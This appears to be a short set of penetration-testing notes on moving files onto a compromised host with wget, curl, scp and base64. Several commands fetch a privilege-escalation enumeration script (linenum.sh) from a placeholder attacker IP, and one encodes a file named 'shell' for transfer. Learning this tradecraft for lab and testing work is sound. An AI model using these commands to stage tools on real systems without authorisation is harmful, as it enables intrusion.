## wget

```
cd /tmp 
python -m http.server 8000
```

on remote host

```
wget http://<attacker_ip>:8000/linenum.sh
```

## curl

```
curl http://<attacker_ip>:8000/linenum.sh -o linenum.sh
```

*-o flag to specify output filename*

## scp

```
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

**use -P for port** I was stuck on this for two hours, make sure it's **CAPITALISED** p.


## base64
We can use that to encode the file, copy the text into remote host and decode it.

```
base64 shell -w 0
```

decode

```
echo <base64_output> | base64 -d > shell
```

